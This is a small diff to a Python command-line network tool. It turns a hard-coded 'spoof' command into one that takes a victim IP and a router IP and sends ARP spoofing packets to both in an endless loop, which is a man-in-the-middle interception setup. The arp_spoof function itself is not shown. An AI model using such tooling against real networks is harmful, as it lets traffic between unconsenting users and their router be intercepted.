@@ -13,16 +13,17 @@ def about():
     typer.echo("A pyhthon network scanner")
 
 @app.command()
-def spoof():
+def spoof(victim_ip: str, router_ip: str):
     """
     Scan the network to find the mac addresses
+    
     Args:
         ip (str): The ip address
     """
     package_count = 0
     while True:
-        arp_spoof('192.168.1.1', '192.168.1.19')
-        arp_spoof('192.168.1.19', '192.168.1.1')
+        arp_spoof(victim_ip, router_ip)
+        arp_spoof(router_ip, victim_ip)
         print("\r", "Paclakage send:" + str(package_count) , end="")
         package_count = package_count + 2
         sleep(1)
@@ -32,6 +33,7 @@ def spoof():
 def scan(ip: str):
     """
     Scan the network to find the mac addresses
+
     Args:
         ip (str): The ip address
     """
